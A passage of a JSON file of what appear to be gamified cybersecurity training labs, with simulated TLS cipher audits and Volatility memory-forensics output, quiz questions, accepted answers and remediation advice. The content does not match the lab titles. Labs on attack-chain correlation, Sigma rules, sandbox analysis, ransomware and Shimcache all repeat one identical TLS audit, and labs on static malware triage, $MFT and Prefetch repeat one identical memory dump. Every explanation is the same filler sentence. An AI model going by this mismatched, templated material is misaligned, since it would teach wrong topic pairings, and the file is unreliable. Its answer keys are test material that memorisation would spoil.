        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-013",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Multi-Stage Attack Chain Correlation: Port Scan, Web Exploit, C2 Beacon",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 210,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-014",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Sigma Detection Rule Authoring for LOLBins Execution",
    "difficulty": "Intermediate",
    "timeEst": "18 min",
    "xpReward": 180,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-ir-001",
    "category": "Incident Response & Malware Forensics",
    "title": "Volatility Memory Forensics: Identifying Injected Code & Meterpreter",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-002",
    "category": "Incident Response & Malware Forensics",
    "title": "Static Malware Triage: PE Headers, Imports & Embedded Strings",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-003",
    "category": "Incident Response & Malware Forensics",
    "title": "Dynamic Sandbox Analysis: Process Mutexes, Reg Keys & C2 Callouts",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 170,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-ir-004",
    "category": "Incident Response & Malware Forensics",
    "title": "Ransomware Triage: Extension Renaming & Encrypted Volume Recovery",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-ir-005",
    "category": "Incident Response & Malware Forensics",
    "title": "Master File Table ($MFT) & USN Journal Timeline Reconstruction",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 210,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-006",
    "category": "Incident Response & Malware Forensics",
    "title": "Windows Prefetch File (.pf) Execution Forensic Analysis",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-007",
    "category": "Incident Response & Malware Forensics",
    "title": "Shimcache & Amcache Registry Evidence of Execution Analysis",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
